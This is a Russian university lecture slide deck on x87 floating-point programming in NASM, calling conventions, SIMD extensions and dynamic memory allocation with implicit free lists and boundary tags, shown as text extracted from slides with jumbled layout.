                                                              © 2024 МГУ/ВМК/СП




          NASM и числа с плавающей точкой
db −0.2                    ; «Четверть»
dw −0.5                    ; IEEE 754r/SSE5
                           ; половинная точность
dd 1.2                     ; одинарная точность
dd 1.222_222_222           ; допускается использовать
                           ; знак подчеркивания
dd 0x1p+2                  ; 1.0x2^2 = 4.0
dq 0x1p+32                 ; 1.0x2^32 = 4 294 967 296.0
dq 1.e10                   ; 10 000 000 000.0
dq 1.e+10                  ; синоним для 1.e10
dq 1.e−10                  ; 0.000 000 000 1
dt 3.141592653589793238462 ; число Пи
do 1.e+4000                ; IEEE 754r четверная точность
__float8__    __Infinity__
                                IEEE 754r – опубликован в 2008 году
__float16__ __NaN__
__float32__ __QNaN__
__float64__ __SNaN__
__float80m__
__float80e__           dq +1.5, −__Infinity__, __NaN__
__float128l__          mov eax, __float32__(3.1415926)            35
__float128h__
                                                       © 2024 МГУ/ВМК/СП




                Сложение двух чисел

extern io_print_hex             main:
extern io_newline                  finit
                                   fld dword [x]
section .data                      fld dword [y]
 x dd 11.2                         faddp
 y dd 0.7                          fstp dword [z]
                                   mov eax, dword[z]
section .bss                       call io_print_hex
 z resd 1                          call io_newline
                                   xor eax, eax
section .text                      ret
global main
  x
  11.2 ~ 1.119999980926513671875E1
  0x41333333 = 01000001 00110011 00110011 00110011            36
                                                       © 2024 МГУ/ВМК/СП




                Сложение двух чисел

extern io_print_hex             main:
extern io_newline                  finit
                                   fld dword [x]
section .data                      fld dword [y]
 x dd 11.2                         faddp
 y dd 0.7                          fstp dword [z]
                                   mov eax, dword[z]
section .bss                       call io_print_hex
 z resd 1                          call io_newline
                                   xor eax, eax
section .text                      ret
global main
  y
  0.7 ~ 6.99999988079071044921875E-1
  0x3F333333 = 00111111 00110011 00110011 00110011            37
                                                       © 2024 МГУ/ВМК/СП




                Сложение двух чисел

extern io_print_hex             main:
extern io_newline                  finit
                                   fld dword [x]
section .data                      fld dword [y]
 x dd 11.2                         faddp
 y dd 0.7                          fstp dword [z]
                                   mov eax, dword[z]
section .bss                       call io_print_hex
 z resd 1                          call io_newline
                                   xor eax, eax
section .text                      ret
global main
  z
  0x413E6666 = 01000001 00111110 01100110 01100110
  1.18999996185302734375E1 ~ 11.9                             38
                                                   © 2024 МГУ/ВМК/СП




                     Печать числа

section .data               main:
 x dd 11.2                     ; …
 y dd 0.7                      ; пролог функции
                               sub     esp, 20
section .bss
 z resd 1                      fld     dword [x]
                               fld     dword [y]
section .rodata                faddp
 lc db '%f', 10, 0             fst     dword [z]
                               fstp    dword [esp + 4]
section .text                  mov     dword [esp], lc
extern printf                  call    printf
global main
                               add     esp, 20
                               ; эпилог функции
                               ; …                        39
                                                    © 2024 МГУ/ВМК/СП




                     Печать числа
                                       printf печатает мусор
section .data               main:      где ошибка?!?!!1
 x dd 11.2                     ; …
 y dd 0.7                      ; пролог функции
                               sub     esp, 20
section .bss
 z resd 1                      fld     dword [x]
                               fld     dword [y]
section .rodata                faddp
 lc db '%f', 10, 0             fst     dword [z]
                               fstp    dword [esp + 4]
section .text                  mov     dword [esp], lc
extern printf                  call    printf
global main
                               add     esp, 20
                               ; эпилог функции
                               ; …                         40
                                                     © 2024 МГУ/ВМК/СП




                     Печать числа
                                       ISO/IEC 9899:1999
section .data               main:      § 6.5.2.2 абзац №6
 x dd 11.2                     ; …
 y dd 0.7                      ; пролог функции
                               sub     esp, 20
section .bss
 z resd 1                      fld      dword [x]
                               fld      dword [y]
section .rodata                faddp
 lc db '%f', 10, 0             fst      dword [z]
                               fstp     qword [esp + 4]
section .text                  mov      dword [esp], lc
extern printf                  call     printf
global main
                               add     esp, 20
                               ; эпилог функции
                               ; …                          41
                                                © 2024 МГУ/ВМК/СП




         Польская обратная запись и x87

                         section .text
  (w + x + y + z) / 4       ;…
                            fld     qword [w]          w
                            fld     qword [x]          x
                            faddp                      +
                            fld     qword [y]          y
  w x + y + z + 4 /
                            faddp                      +
                            fld     qword [z]          z
                            faddp                      +
                            fild    dword [d]          4
section .data               fdivp ; st1 / st0          /
 w dq 1e10                  ;…
 x dq 1e10
 y dq 1e10
 z dq 1e10
 d dd 4
                                                       42
                                                      © 2024 МГУ/ВМК/СП




  Какой должен быть порядок вычислений?
                                              n
• t = t1 binop t2                                 t

• Для вычисления подвыражения ti    n1                n2
                                         t1                t2
  требуется ni регистров
• Число Ершова
             max 𝑛1, 𝑛2 , 𝑛1 ≠ 𝑛2
      𝑛=ቊ
                𝑛1 + 1, 𝑛1 = 𝑛2

• Наихудший по расходу регистров
  вариант – вычисление
  сбалансированного дерева
                                                                43
                                                 © 2024 МГУ/ВМК/СП




        Порядок действий имеет значение

section .data            main:
 x dq 3.14                  ; … пролог функции
 y dq 1e50                  sub     esp, 20
 z dq -1e50
                            fld     qword [x]
section .bss                fld     qword [y]
 r resq 1                   fld     qword [z]
                            faddp
section .rodata             faddp
 lc db '%f', 10, 0          fst     qword [r]
                            fstp    qword [esp + 4]
section .text               mov     dword [esp], lc
extern printf               call    printf
global main
                            add     esp, 20
                            ; … эпилог функции          44
                                                       © 2024 МГУ/ВМК/СП




           Порядок действий имеет значение

main:                          main:
   ; … пролог функции             ; … пролог функции
   sub     esp, 20                sub     esp, 20

   fld       qword [y]            fld     qword [x]
   fld       qword [z]            fld     qword [y]
   fld       qword [x]            fld     qword [z]
   faddp                          faddp
   faddp                          faddp
   fst       qword [r]            fst     qword [r]
   fstp      qword [esp + 4]      fstp    qword [esp + 4]
   mov       dword [esp], lc      mov     dword [esp], lc
   call      printf               call    printf

   add     esp, 20                add     esp, 20
   ; … эпилог функции             ; … эпилог функции          45
                                                     © 2024 МГУ/ВМК/СП




                Распределение слагаемых

section .data                main:
 x dt 1e4000                    ; … пролог функции
 y dt 1e4000                    sub     esp, 20
 z dt 1e4000
                                fld     tword [x]
section .bss                    fld     tword [y]
 r resq 1                       fsubp
                                fld     tword [z]
section .rodata                 fmulp
 lc db '%lf', 10, 0             fst     qword [r]
                                fstp    qword [esp + 4]
                                mov     dword [esp], lc
                                call    printf

                                add     esp, 20
                                ; … эпилог функции          46
                                                     © 2024 МГУ/ВМК/СП




                Распределение слагаемых

section .data                main:
 x dt 1e4000                    ; … пролог функции
 y dt 1e4000                    sub     esp, 20
 z dt 1e4000
                                fld     tword [x]
section .bss                    fld     tword [z]
 r resq 1                       fmulp
                                fld     tword [y]
section .rodata                 fld     tword [z]
 lc db '%lf', 10, 0             fmulp
                                fsubp
                                ; вызов printf

                                add     esp, 20
                                ; … эпилог функции
                                                            47
                                                   © 2024 МГУ/ВМК/СП




                Распределение слагаемых

section .data            fstcw  word [cw]
 x dt 1e4000             and word [cw], 11111111_11000000b
 y dt 1e4000             fldcw  word [cw]
 z dt 1e4000
                         fld     tword [x]
section .bss             fld     tword [z]
 r resq 1                fmulp
 cw resw 1               fld     tword [y]
                         fld     tword [z]
section .rodata          fmulp
 lc db '%lf', 10, 0      fsubp
                         ; вызов printf
main:
   ; … пролог функции    add     esp, 20
   sub     esp, 20       ; … эпилог функции
                                                          48
                                                   © 2024 МГУ/ВМК/СП




         Предопределенные константы

• На «верхушку» стека регистров (St0) помещается
  определенная константа
   – FLD1     +1.0
   – FLDL2T   log210
   – L2E      log2e
   – FLDPI    
   – FLDLG2   log102
   – FLDLN2   loge2
   – FLDZ     +0.0




                                                          49
             © 2024 МГУ/ВМК/СП




Лекция 0xF


 6 апреля
                                                     © 2024 МГУ/ВМК/СП




                       Сравнение чисел

_Bool isLe(double x, float y) {
   return x <= y;
}
                                  isLe:
                                      push    ebp
                                      mov     ebp, esp
                                      fld     dword [ebp+16]
    Результат
                  С3   С2   С0        fld     qword [ebp+8]
    сравнения
                                      fucompp ; St0 vs. St1
  St0 > St1       0    0    0         fnstsw ax
  St0 < St1       0    0    1         sahf
  St0 == St1      1    0    0         setbe   al
                                      pop     ebp
  неопределенно   1    1    1
                                      ret


                                                             2
                                                         © 2024 МГУ/ВМК/СП




          Извлечение результатов сравнения

• C3 → ZF, C0 → CF              Результат сравнения ZF   PF      CF
• Можно использовать условные   St0 >   St(i)       0    0        0
  коды, применяемые при
  сравнении беззнаковых чисел   St0 <   St(i)       0    0        1
isLe:                           St0 == St(i)        1    0        0
   ...                          неупорядочены       1    1        1
   fld     dword [ebp+16]
   fld     qword [ebp+8]
   fucompp ; St0 vs. St1
   fnstsw ax
   sahf
   setbe   al
   ...



                                                                 3
                                                             © 2024 МГУ/ВМК/СП




       Непосредственное обновление EFLAGS

• F[U]COMI[P] St(i)                 Результат сравнения ZF   PF      CF
                                    St0 >   St(i)       0    0        0
   – появились в P6
                                    St0 <   St(i)       0    0        1
                isLe(2.0, 3.0)
isLe:                               St0 == St(i)        1    0        0
   ...                              неупорядочены       1    1        1
   fld     dword [ebp+16]
   fld     qword [ebp+8]
   fucomip ; st0 vs. st1
   setbe   al
   ...                 BE:
                       CF = 1 или ZF = 1




                                                                     4
                                                              © 2024 МГУ/ВМК/СП




                    Условная пересылка

• FCMOVcc St(i)                   Условие      ZF   PF   CF     Код
                               St0 >   St(i)   0    0    0        A
     – появились в P6
                               St0 <   St(i)   0    0    1        B
f:                             St0 == St(i)    1    0    0        E
     push    ebp
     mov     ebp, esp          неупорядочены 1    1   1    U
     fld     qword [ebp+16]
     fld     qword [ebp+8]
     fucomip st0, st1
     fld     qword [ebp+24]
     fcmovbe st1
     fstp    st1    double f(double a, double b, double c) {
     pop     ebp       return a > b? c : b;
     ret            }

                                                                      5
                                                                  © 2024 МГУ/ВМК/СП



           Функции: возвращаемое значение –
               число с плавающей точкой
void caller(double *p) {               float inverse(double x) {
   *p = inverse(*p);                      return 1/x;
}                                      }
caller:                                На входе в функцию регистры
   push     ebp                        St0 – St7 должны быть пустыми
   mov      ebp, esp                   inverse:
   sub      esp, 8                        push    ebp
   mov      eax, dword [ebp+8]            mov     ebp, esp
   fld      qword [eax]                   fld1
   fstp     qword [esp]                   fld     qword [ebp+8]
   call     inverse                       fdivp
   mov      eax, dword [ebp+8]            pop ebp
   fstp     qword [eax]                   ret
   leave    На выходе из функции:
   ret      1. регистры St1 – St7 должны быть пустыми,
            2. регистр St0 содержит возвращаемое значение                 6
                                                                       © 2024 МГУ/ВМК/СП



         Классификация соглашений вызова
      Си-функций для платформы gcc/Linux/IA-32
                          Передача параметров и очистка от них стека
FASTCALL – первые два параметра на регистрах ECX и EDX
(если умещаются), остальные – на стеке
Очищает от стековых параметров вызванная функция

STDCALL – все параметры на стеке
Очищает стек вызванная функция

CDECL – все параметры на стеке
Очищает стек вызывающая функция




                                                                  Возвращаемое
                                                                  значение


                                                                               7
Использование регистра EBP
                                                                                    © 2024 МГУ/ВМК/СП



        Синхронизация вычислений над целыми
             числами и плавающей точкой
   •   Работа с целыми числами и плавающей точкой ведется различными
       функциональными устройствами
        –   Изначально два физически разнесенных конвейера вычислений
        –   В настоящий момент – специализированные вычислители для этапа конвейера
        –   Длительность обработки плавающей точки существенно больше, чем целых чисел
   •   Немаскируемые прерывания могут нарушить логику работы программы!
        –   Перед выполнением очередной команды «сопроцессор» проверяет флаг ES, если флаг
            взведен – передает управление заранее определенной функции-обработчику
        –   Нарушение синхронизации может произойти в период между возникновением
            исключения и его обработкой
        –   Обработчик прерывания не увидит состояния регистров/памяти на момент
            возникновения исключения
 fild dword [cntr]
 inc dword [cntr]                 fild dword [cntr]
 fsqrt                            fsqrt                           fild dword [cntr]
                                  inc dword [cntr]                fsqrt
                                                                  wait
Обработка исключений сопроцессора синхронизируется                inc dword [cntr]
выполнением либо следующей команды сопроцессора,
                                                                                             8
либо командой fwait/wait
                                                                                 © 2024 МГУ/ВМК/СП



             Как ускорить работу процессора?
     (над числами с плавающей точкой и не только)
•   Задача – как можно больше операций за единицу времени
    Единица измерения FLOPS (flop/s, FLoating-point OPerations per Second)
•   Увеличить частоту работы процессора
     –   Очень ограниченные возможности по наращиванию
•   Использовать несколько компьютеров для решения общей задачи
•   Разместить несколько процессоров на одной системной плате
•   Разместить несколько вычислительных ядер на одной микросхеме
    (кристалле)
     –   Возможности определяются совершенствованием тех. процесса,                 Параллелизм
         уменьшением размера отдельного транзистора
•   Выполнять одновременно несколько операций на FP в одной команде
     –   Возможности определяются параллелизмом программы
     –   Заменяем действия над скалярными величинами действиями над векторами!

                                                     Поток команд
                                          Один поток           Много потоков
       Поток        Один поток                SISD                  MISD
      данных
                   Много потоков             SIMD                   MIMD
                                                                                         9
Классификация параллельных вычислительных систем по Флинну, Flynn's taxonomy
                                                                                                 © 2024 МГУ/ВМК/СП




                     Векторная команда

• Регистр содержит массив чисел
• Одна команда выполняет операцию одновременно над каждым
  элементом массива
• Число элементов векторного регистра может превосходить
  параллелизм алгоритма

double *A, *B, *C;
…
for (i=0; i<N; i++) {
   C[i] = A[i] + B[i];                     Векторная команда                          Скалярная команда
}




                         Chris Lomont. Introduction to Intel® Advanced Vector Extensions
                                                                                                          10
                                                                                                            © 2024 МГУ/ВМК/СП




                                 Векторные команды в x86
     •    MMX
            –   8 MM регистров, каждый по 64 бита
            –   Логически перекрываются с регистрами x87
            –   Операции над целыми числами, насыщение (saturation) и циклическая арифметика (wraparound)
     •    SSE
            –   Технологии компаний «разошлись»
                   •   Intel: SSE 1 – 4.2
                   •   AMD: 3DNow!, SSE 4a, SSE 5
            –   8/16 XMM регистров, каждый по 128 битов
            –   Работа как с целыми числами,
                так и с плавающей точкой
            –   SSE 4.2 включает команды CRC32 и POPCNT            Эволюция SIMD расширений
     •    AVX                                                      ISA x86/x87
            –   Новая система кодирования команд,
                добавлены трехадресные (неразрушающие)
                форматы команд
            –   Удвоен размер векторных регистров YMM




Vectorization Opportunities for Improved Performance with Intel® AVX-512                                           11
https://www.codeproject.com/Articles/1182515/Vectorization-Opportunities-for-Improved-Perform
                                                                                                         © 2024 МГУ/ВМК/СП




                         Примеры векторных команд

     • Арифметика с насыщением
           – PADD[U]S[B|W] mm, mm/m64
           – Сложить с насыщением запакованные [без]знаковые целые
             числа размером [1 байт | 2 байта]
     • Векторное сложение
           – ADDPD xmm1, xmm2/m128
           – Сложить запакованные числа с плавающей точкой двойной
             точности и сохранить результат в xmm1
     • Скалярное сложение на векторных регистрах
           – ADDSS xmm1, xmm2/m32
           – Сложить число с плавающей точкой одинарной точности из
             младших разрядов xmm регистров и сохранить результат в
               xmm1


В Си программах «вручную» задействовать векторные команды можно с помощью механизма встроенных функций          12
https://db.in.tum.de/~finis/x86-intrin-cheatsheet-v2.2.pdf?lang=en
                                    © 2024 МГУ/ВМК/СП




                    Далее ...

• Динамическая память
  – Организация и управление
  – Численные характеристики
  – Управление свободными блоками
  – Сборка мусора




                                           13
                                                           © 2024 МГУ/ВМК/СП




        Управление динамической памятью
                                               Приложение
#include <stdlib.h>
                                                Менеджер
void *calloc(size_t nmemb, size_t size);
                                            динамической памяти
void *malloc(size_t size);
void free(void *ptr);
void *realloc(void *ptr, size_t size);
                                                   Куча


 • Программисты используют функции выделения
   динамической памяти (например, malloc) для того,
   чтобы получить память под переменные во время
   выполнения.
    – Для структур данных, размер которых известен только во
      время выполнения.
 • Эти функции управляют пространством памяти
                                                                  14
   программы, называемой куча.
                                                                © 2024 МГУ/ВМК/СП




                      Интерфейсные функции

                                      #include <unistd.h>

                                      int brk(void *addr);
      Пользовательский стек           void *sbrk(intptr_t increment);


                                 Верхушка
                                 кучи sbrk(0);
              Куча

     Неинициализированные
    статические данные (.bss)
       Инициализированные
    статические данные (.data)

     Код программы (.text)
                                                                       15
0
                                                                  © 2024 МГУ/ВМК/СП




       Выделение динамической памяти
• Менеджер памяти рассматривает пространство кучи
  как множество блоков различного размера, которые
  либо выделены, либо свободны
• Различные способы управления динамической
  памятью
  – Явное управление: разработчик сам выделяет и
    освобождает пространство в памяти
     • Например, malloc и free в языке Си
  – Неявное управление: разработчик выделяет память но не
    освобождает
     • Сборщик мусора в языках Python, Java, ML, Lisp, в платформе .NET
     • Умные указатели (smart pointers) – подсчет «живых» ссылок на
       выделенную память. Освобождает память библиотека (boost,
       std::unique_ptr в языке Си++11) или компилятор (язык Rust).
                                                                         16
                                                              © 2024 МГУ/ВМК/СП



 void foo(int n, int m) {
     int i, *p;

 /* Выделяем блок из n целых чисел */

      p = (int *) malloc(n * sizeof(int));
      if (p == NULL) {                       • В дальнейшем
          perror("malloc");                    материале
          exit(0);                             предполагается, что
      }                                        выделение и
                                               освобождение памяти
      ...                                      происходит с блоками
                                               машинных слов
 /* Возвращаем пространство в кучу */        • Машинное слово
     free(p);                                  вмещает указатель, т.е.
 }                                             4 байта




Выделенный блок         Свободный блок        Свободное слово
    (4 слова)              (3 слова)                                 17
                                              Занятое слово
                                    © 2024 МГУ/ВМК/СП



Пример: выделение и освобождение памяти
         в произвольном порядке
p1 = malloc(16)


p2 = malloc(20)


p3 = malloc(24)


free(p2)


p4 = malloc(8)



                                           18
                                                                      © 2024 МГУ/ВМК/СП




                         Ограничения

• Пользовательская программа
   – Произвольная последовательность вызовов функций malloc и
     free
   – Вызовы free получают в качестве параметра указатель
     полученный из функции malloc

• Менеджер памяти
   – Никак не может повлиять на запрашиваемый размер блоков или
     число этих запросов
   – Обязан предоставлять запрошенную память незамедлительно
      • нет возможности буферизировать запросы (переупорядочить)
   – Блоки выделяются в свободной памяти
   – Выделяемые блоки должны быть выровнены
      • выравнивание 8 байт для GNU malloc (libc malloc) в ОС Linux
   – Нет возможности перемещать уже выделенные блоки
      • нельзя собрать вместе выделенную память
                                                                             19
                                                                          © 2024 МГУ/ВМК/СП



                     Производительность
                    Пропускная способность
• Имеется некоторая последовательность вызовов malloc
  и free:
   – R0, R1, ..., Rk, ... , Rn-1

• Цели: максимально увеличить пропускную способность
  менеджера и пиковое использование памяти
   – Эти цели часто конфликтуют

• Пропускная способность
   – Число выполненных запросов за единицу времени
   – Пример
        • 5 000 вызовов malloc и 5 000 вызовов free в течение 10 секунд
        • Пропускная способность 1 000 операций в секунду


                                                                                 20
                                                             © 2024 МГУ/ВМК/СП



                   Производительность
                  Пиковое использование
• Дана последовательность вызовов функций malloc и
  free
  – R0, R1, ..., Rk, ... , Rn-1
• Суммарная полезная нагрузка Pk
  – malloc(p) возвращает блок с полезной нагрузкой в p байт
  – После завершения вызова Rk, суммарная полезная нагрузка
    Pk - сумма всех выделенных, но еще не освобожденных
    блоков памяти
• Текущий размер кучи Hk
  – Предполагается Hk монотонно не убывает
       • т.е. в результате вызовов sbrk куча только растет
• Пиковое использование памяти после k запросов
  – Uk = ( maxi<k Pi ) / Hk

                                                                    21
                                                               © 2024 МГУ/ВМК/СП




                Внутренняя фрагментация
• Внутренняя фрагментация возникает если размер полезной нагрузки
  меньше размера блока
                                Блок

 Внутренняя                                              Внутренняя
 фрагментация             Полезная нагрузка              фрагментация

• Причины возникновения
   – Накладные расходы на поддержку внутренних структур данных
   – Выравнивание
   – Особенности политики выделения блоков
     (например, принудительно выделяется блок большего размера)
• Зависит только от последовательности предыдущих запросов памяти
   – Легко измерить


                                                                      22
                                                      © 2024 МГУ/ВМК/СП




              Внешняя фрагментация

• Возникает, когда в куче суммарно содержится
  достаточное количество свободных блоков, но нет
  единого блока требуемого размера
  p1 = malloc(16)

  p2 = malloc(20)

  p3 = malloc(24)

  free(p2)

  p4 = malloc(24)     Отказ в предоставлении памяти

• Зависит от того, что будет запрашиваться в будущем
   – Трудно оценить                                          23
                                                   © 2024 МГУ/ВМК/СП




  Проблемы реализации менеджера памяти

• Как следует запоминать, сколько памяти должно быть
  освобождено для данного адреса?

• Как лучше поддерживать информацию о свободных
  блоках?

• Если принято решение выделить блок большего размера,
  чем было запрошено, что делать с лишней памятью?

• Какой блок лучше выбрать для выделения?

• Как лучше распорядиться освобожденным блоком?

                                                          24
                                                          © 2024 МГУ/ВМК/СП




                  Сколько освобождать?

• Стандартный метод
  – Размещаем длину блока в слове, предшествующем блоку.
      • Такое слово называют заголовком
  – Требуется дополнительное слово на каждый выделяемый
    блок


                                           p0

p0 = malloc(16)                           20


                                  размер блока   данные

      free(p0)

                                                                 25
                                                             © 2024 МГУ/ВМК/СП




       Как отслеживать свободные блоки
• Метод 1: неявный список с использованием длины блока

        20          16        24              8


• Метод 2: Явный список свободных блоков с
  использованием указателей

        20          16        24              8

• Метод 3: Раздельные списки
   – Распределение блоков по раздельным спискам, исходя из
     размеров этих блоков

• Метод 4: Сортировка блоков по размеру
   – Можно использовать сбалансированное дерево (например,
     Красно-Черные деревья) с указателями в каждом свободном
     блоке, и с длиной блока в качестве ключа                       26
                                                                             © 2024 МГУ/ВМК/СП




                Метод 1: Неявный список

• Для каждого блока необходимо знать его длину и состояние -
  выделен/свободен
   – Расточительно использовать для этого два слова
• Стандартный прием
   – Если блоки выровнены в памяти, несколько младших битов адреса всегда 0, а
     размер блока кратен некоторой степени двойки
   – Вместо 0 храним в младшем бите заголовка флаг, выделен или свободен блок
   – Когда заголовок интерпретируется как размер блока, младший бит
     маскируется
                                     1 слово

                                                      a = 1: блок занят
                                   Размер       a     a = 0: блок свободен
   Формат выделенных
   и свободных блоков
                                   Полезная
                                   нагрузка


                                 Выравнивание                                       27
                                                                    © 2024 МГУ/ВМК/СП



                                   Пример
                                Неявный список

 Не используется

Начало             8/0   16/1      32/0                      16/1             0/1
 кучи



            Выровнено по
            границе               Выделенные блоки: серая заливка
            двойного              Свободные блоки: белое
            слова (8 байт)        Заголовки: обозначены размером в байтах
                                            /битом выделения




                                                                            28
                                                                       © 2024 МГУ/ВМК/СП



                      Неявный список
                   Поиск свободного блока
• Первый подходящий:
   – Проходим список с начала, выбираем первый подходящий блок:
                                                                      Здесь и далее
     p = start;                                                         приводится
     while ((p < end) &&                  // пока не дошли до конца   Си-подобный
                                                                         псевдокод
            ((*p & 1) ||                  // уже выделен
            (*p < len)))                  // маловато будет
       p = p + (*p & -2);                 // переходим на следующий блок
   – Выделение за линейное время
   – На практике может вызывать «дробление» блоков в начале списка
• Следующий подходящий:
   – Аналогично предыдущему, поиск продолжается с позиции на которой он
     остановился ранее
   – Как правило работает быстрее: не происходит повторного просмотра
     неподходящих блоков
   – Некоторые исследования допускают худшую фрагментацию
• Наилучший:
   – Просмотр всего списка, выбор наилучшего свободного блока
     •   меньше всего байт сверх запрошенного размера
   – Небольшой размер незанятых фрагментов                                    29
   – Как правило, работает медленнее, чем первый подходящий
                                                                            © 2024 МГУ/ВМК/СП



                       Неявный список
                  Выделение свободного блока
     • Выделение свободного блока: расщепление
         – Если размер требуемой памяти меньше, чем доступное в
           свободном блоке пространство, блок можно расщепить

                   16         16            24                 8

       addblock(p, 16)                      p

                   16         16            16           8     8

void addblock(ptr p, int len) {
  int newsize = ((7 + len) >> 3) << 3;          // «выравниваем вверх» по
                                                // 8 байтной границе
    int oldsize = *p & -2;                      // маскируем и считываем размер
    *p = newsize | 1;                           // выставляем новую длину блока
    if (newsize < oldsize)
      *(p + newsize) = oldsize - newsize;       // выставляем длину нового блока 30
}
                                                           © 2024 МГУ/ВМК/СП



                         Неявный список
                       Освобождение блока
  • Невероятно простая реализация!
      – Всего лишь нужно сбросить флаг, показывающий выделен
        блок или свободен
               void free_block(ptr p) { *p = *p & -2 }

      – К сожалению, приходим к «ложной фрагментации»

                  16        16        16           8   8
     free(p)
                                      p

                  16        16        16           8   8

     malloc(20) Возвращается NULL!

Несмотря на то, что свободное пространство есть,
                                                                  31
менеджер памяти его не в состоянии найти
                                                        © 2024 МГУ/ВМК/СП



                    Неявный список
                       Слияние
 • Объединение (слияние) со следующим/предыдущим
   блоком, если он свободен
    – Слияние со следующим блоком

              16      16        16       8   8    С точки зрения
                                                  менеджера памяти
    free(p)                     p                 заголовок больше
                                                  не существует
              16      16        24       8   8


void free_block(ptr p) {
    *p = *p & -2;           // сбрасываем флаг
    next = p + *p;          // находим следующий блок
    if ((*next & 1) == 0)   // если он свободен
      *p = *p + *next;      // добавляем его к текущему блоку
}
                                                               32
    – Как провести слияние с предыдущим блоком?
                                                                        © 2024 МГУ/ВМК/СП



                   Неявный список
               Двунаправленное слияние
• Граничные теги [Кнут 73]
   – Повторяем заголовок (размер/флаг) в конце блока
   – Появляется возможность проходить список в обратном направлении за
     счет дополнительного расходования памяти
   – Общеупотребительный технический прием

        16       16 16        16 24             24 16         16



        Заголовок           Размер      a    a = 1: Блок занят
                                             a = 0: Блок свободен
Формат выделенных
                         Полезная нагрузка   Размер: Общий размер всего блока
и свободных блоков           (с учетом
                          выравнивания)

      Граничный тег         Размер      a
         (footer)                                                               33
                                                         © 2024 МГУ/ВМК/СП




           Слияние за фиксированное время


                 Случай 1   Случай 2   Случай 3   Случай 4

                 Занято      Занято    Свободно   Свободно
Освобождаемый
          блок
                 Занято     Свободно    Занято    Свободно




                                                                34
                                     © 2024 МГУ/ВМК/СП




Слияние за фиксированное время (Случай 1)

        m1   1        m1   1


        m1   1        m1   1
        n    1        n    0


        n    1        n    0
        m2   1        m2   1


        m2   1        m2   1




                                            35
                                      © 2024 МГУ/ВМК/СП




Слияние за фиксированное время (Случай 2)

        m1   1         m1    1


        m1   1         m1    1
        n    1        n+m2   0


        n    1
        m2   0


        m2   0        n+m2   0




                                             36
                                     © 2024 МГУ/ВМК/СП




Слияние за фиксированное время (Случай 3)

        m1   0       n+m1   0


        m1   0
        n    1


        n    1       n+m1   0
        m2   1        m2    1


        m2   1        m2    1




                                            37
                                     © 2024 МГУ/ВМК/СП




Слияние за фиксированное время (Случай 4)

        m1   0      n+m1+m2   0


        m1   0
        n    1


        n    1
        m2   0


        m2   0      n+m1+m2   0




                                            38
                                                © 2024 МГУ/ВМК/СП




   Результат применения Граничных Тегов

• При незамедлительном слиянии куча
  представляет собой последовательность
  чередующихся блоков: свободных и занятых
• Недостатки
  – Внутренняя фрагментация
  – Есть ли возможности для оптимизации?
     • Каким блокам нужен тег нижней границы?
     • … и что это значит?




                                                       39
                                                                         © 2024 МГУ/ВМК/СП



          Промежуточные итоги
    Ключевые правила выделения памяти
• Правила размещения:
   – Первый подходящий, следующий подходящий, наилучший, и др.
   – Компромисс между пропускной способностью и фрагментацией
   – Дальнейший материал: раздельные списки свободных блоков
     приближение к поиску наилучшего блока без просмотра всего списка
     свободных блоков
• Правила расщепления:
   – При каких условиях следует расщеплять свободные блоки?
   – До какого уровня может быть доведена внутренняя фрагментация?
• Правила слияния:
   – Безотлагательное слияние: выполняем слияние каждый раз, когда
     вызываем функцию free
   – Отложенное слияние: можно попытаться улучшить
     производительность функции free, откладывая слияние на
     некоторое время. Примеры:
       • Объединяем при просмотре списка свободных блоков во время вызова
         функции malloc
       • Объединяем когда внешняя фрагментация достигает некоторого порогового
         значения
                                                                                 40
                                                                  © 2024 МГУ/ВМК/СП



                 Промежуточные итоги
                   Неявные списки
• Реализация: крайне простая
• Стоимость выделения памяти:
   – в худшем случае линейная сложность (время)
• Стоимость освобождения:
   – константное время
   – даже при выполнении слияния!
• Использование памяти:
   – зависит от правил (политики) размещения данных в свободных
     блоках
   – Первый подходящий, следующий подходящий, или наилучший

• На практике malloc/free не используют этот метод по
  причине линейной сложности, возникающей при выделении
  памяти
    используется во многих других случаях

• Тем не менее, идеи расщепления, граничных тегов и слияния
  используются во всех менеджерах динамической памяти
                                                                         41
              © 2024 МГУ/ВМК/СП




Лекция 0x10


 10 апреля
                                                                         © 2024 МГУ/ВМК/СП



          Промежуточные итоги
    Ключевые правила выделения памяти
• Правила размещения:
   – Первый подходящий, следующий подходящий, наилучший, и др.
   – Компромисс между пропускной способностью и фрагментацией
   – Дальнейший материал: раздельные списки свободных блоков
     приближение к поиску наилучшего блока без просмотра всего списка
     свободных блоков
• Правила расщепления:
   – При каких условиях следует расщеплять свободные блоки?
   – До какого уровня может быть доведена внутренняя фрагментация?
• Правила слияния:
   – Безотлагательное слияние: выполняем слияние каждый раз, когда
     вызываем функцию free
   – Отложенное слияние: можно попытаться улучшить
     производительность функции free, откладывая слияние на
     некоторое время. Примеры:
       • Объединяем при просмотре списка свободных блоков во время вызова
         функции malloc
       • Объединяем когда внешняя фрагментация достигает некоторого порогового
         значения
                                                                                 2
                                                                  © 2024 МГУ/ВМК/СП



                 Промежуточные итоги
                   Неявные списки
• Реализация: крайне простая
• Стоимость выделения памяти:
   – в худшем случае линейная сложность (время)
• Стоимость освобождения:
   – константное время
   – даже при выполнении слияния!
• Использование памяти:
   – зависит от правил (политики) размещения данных в свободных
     блоках
   – Первый подходящий, следующий подходящий, или наилучший

• На практике malloc/free не используют этот метод по
  причине линейной сложности, возникающей при выделении
  памяти
    используется во многих других случаях

• Тем не менее, идеи расщепления, граничных тегов и слияния
  используются во всех менеджерах динамической памяти
                                                                          3
                                                                                    © 2024 МГУ/ВМК/СП



           Задача на моделирование работы
           менеджера динамической памяти
•   Размер кучи – 12 четырехбайтных слов           •   Требуется определить
•   Неявный список                                      –   Состояние кучи после
                                                            выполнения запросов
•   Размер в заголовке и граничном теге                        1.   p1=malloc(5)
•   В выделенных блоках граничный тег не                       2.   p2=malloc(11)
    используется                                               3.   free(p1)
                                                               4.   p3=malloc(4)
•   Память выравнивается по 8-ми байтной                       5.   p4=malloc(5)
    границе                                                    6.   free(p2)
•   Поиск свободного блока:                             –   Пиковое использование памяти
    с начала / с текущей позиции                            U6
•   Выбирается первый подходящий
    свободный блок
•   При расщеплении используется 1я часть
                                                            Начальное состояние кучи
•   Слияние проводится незамедлительно
•   Первый выделенный блок –
    служебный,                 Не используется
    неудаляемая
    «голова» списка           Начало           8/1      32/0                              32/0 0/1
                                кучи
                                                                                            4
                                                             © 2024 МГУ/ВМК/СП




       Как отслеживать свободные блоки
• Метод 1: неявный список с использованием длины блока

        20          16        24              8


• Метод 2: Явный список свободных блоков с
  использованием указателей

        20          16        24              8

• Метод 3: Раздельные списки
   – Распределение блоков по раздельным спискам, исходя из
